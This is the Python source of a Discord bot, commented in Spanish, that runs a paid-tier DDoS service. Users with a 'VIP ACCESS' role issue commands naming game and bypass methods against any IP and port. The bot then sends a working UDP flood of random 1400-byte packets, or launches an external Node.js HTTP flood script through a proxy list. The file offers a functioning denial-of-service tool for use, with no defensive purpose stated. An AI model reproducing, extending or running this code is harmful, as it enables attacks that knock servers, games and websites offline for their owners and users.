import discord
from discord.ext import commands
import asyncio
import threading
import socket
import time
import random
import subprocess

TOKEN = 'TU_TOKEN_DISCORD'  # Reemplaza con tu token
INTENTS = discord.Intents.default()
INTENTS.message_content = True
INTENTS.guilds = True
INTENTS.members = True

bot = commands.Bot(command_prefix='!', intents=INTENTS)

active_attacks = {}
cooldowns = {}
global_attack_running = False
admin_id = 1367535670410875070

vip_methods = [
    "hudp", "udpbypass", "dnsbypass", "roblox", "fivem",
    "fortnite", "udpraw", "tcproxies", "tcpbypass", "udppps", "samp", "http-raw"
]

def build_strong_payload():
    return random._urandom(1400)

def strong_udp_bypass(ip, port, duration, stop_event):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout and not stop_event.is_set():
        try:
            for _ in range(200):
                sock.sendto(build_strong_payload(), (ip, port))
        except:
            continue

async def start_attack(ctx, method, ip, port, duration, is_vip=False):
    global global_attack_running

    if not ip or not port or not duration:
        await ctx.send(f"❗ Uso correcto: `!{method} <ip> <port> <time>`")
        return

    if ip == "127.0.0.1":
        await ctx.send("❌ No puedes atacar 127.0.0.1.")
        return

    max_time = 300 if is_vip else 60
    if duration > max_time:
        await ctx.send(f"⚠️ El máximo permitido es {max_time} segundos.")
        return

    if ctx.author.id in active_attacks:
        await ctx.send("⛔ Ya tienes un ataque activo.")
        return

    if ctx.author.id in cooldowns:
        await ctx.send("⏳ Debes esperar antes de otro ataque.")
        return

    if global_attack_running:
        await ctx.send("⚠️ Solo un ataque activo global a la vez.")
        return

    global_attack_running = True
    stop_event = threading.Event()
    active_attacks[ctx.author.id] = stop_event

    embed = discord.Embed(
        title="🚀 Ataque Iniciado",
        description=f"**Método:** `{method.upper()}`\n**IP:** `{ip}`\n**Puerto:** `{port}`\n**Duración:** `{duration}s`\n**Usuario:** <@{ctx.author.id}>",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

    thread = threading.Thread(target=strong_udp_bypass, args=(ip, port, duration, stop_event))
    thread.start()

    await asyncio.sleep(duration)
    if not stop_event.is_set():
        stop_event.set()
        await ctx.send(f"✅ Ataque finalizado para <@{ctx.author.id}>.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global_attack_running = False

    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def methods(ctx):
    embed = discord.Embed(title="📜 Métodos VIP-BYPASS", color=discord.Color.blue())
    for method in vip_methods:
        embed.add_field(name=f"!{method}", value="(VIP - Potente)", inline=True)
    await ctx.send(embed=embed)

def make_vip_command(method):
    if method == "http-raw":
        return  # Se maneja por separado
    @bot.command(name=method)
    async def cmd(ctx, ip: str = None, port: int = None, duration: int = None):
        role_names = [r.name.lower() for r in ctx.author.roles]
        if "vip access" not in role_names:
            await ctx.send("❌ Este método es exclusivo de usuarios con **VIP ACCESS**.")
            return
        await start_attack(ctx, method.upper(), ip, port, duration, is_vip=True)
    return cmd

for method in vip_methods:
    make_vip_command(method)

@bot.command()
async def stop(ctx):
    if ctx.author.id not in active_attacks:
        await ctx.send("❌ No tienes ataques activos.")
        return
    active_attacks[ctx.author.id].set()
    await ctx.send("🛑 Ataque detenido.")
    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global global_attack_running
    global_attack_running = False
    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def stopall(ctx):
    if ctx.author.id != admin_id:
        await ctx.send("❌ Solo el administrador puede detener todos los ataques.")
        return
    for stop_event in active_attacks.values():
        stop_event.set()
    active_attacks.clear()
    global global_attack_running
    global_attack_running = False
    await ctx.send("🛑 Todos los ataques fueron detenidos.")

@bot.command()
async def dhelp(ctx):
    embed = discord.Embed(title="📘 Comandos disponibles", color=discord.Color.gold())
    for method in vip_methods:
        if method == "http-raw":
            embed.add_field(name=f"!{method} <url> <time>", value="(VIP - HTTP Flood hasta 300s)", inline=False)
        else:
            embed.add_field(name=f"!{method} <ip> <port> <time>", value="(VIP - UDP Potente)", inline=False)
    embed.add_field(name="!stop", value="Detiene tu ataque actual", inline=False)
    embed.add_field(name="!stopall", value="Admin: Detiene todos los ataques", inline=False)
    embed.add_field(name="!methods", value="Lista de métodos disponibles", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="http-raw")
async def http_raw(ctx, url: str = None, duration: int = None):
    if not url or not duration:
        await ctx.send("❗ Uso correcto: `!http-raw <url> <time>`")
        return
    if not url.startswith("http://") and not url.startswith("https://"):
        await ctx.send("❌ Solo se permiten URLs que comiencen con http:// o https://")
        return
    if duration > 300:
        await ctx.send("⚠️ El máximo permitido es 300 segundos.")
        return

    role_names = [r.name.lower() for r in ctx.author.roles]
    if "vip access" not in role_names:
        await ctx.send("❌ Este método es exclusivo de usuarios con **VIP ACCESS**.")
        return

    if ctx.author.id in active_attacks:
        await ctx.send("⛔ Ya tienes un ataque activo.")
        return

    active_attacks[ctx.author.id] = threading.Event()
    await ctx.send(f"🚀 Ataque HTTP-RAW iniciado hacia `{url}` durante `{duration}` segundos.")

    try:
        subprocess.Popen([
            "node", "HTTP-RAW.js", url, str(duration), "proxies.txt"
        ])
    except Exception as e:
        await ctx.send(f"❌ Error al ejecutar el ataque: {e}")
        active_attacks.pop(ctx.author.id, None)
        return

    await asyncio.sleep(duration)
    del active_attacks[ctx.author.id]
    await ctx.send(f"✅ Ataque HTTP-RAW finalizado para <@{ctx.author.id}>.")

@bot.event
async def on_ready():
    print(f"✅ Bot activo como {bot.user.name}")

bot.run(TOKEN)
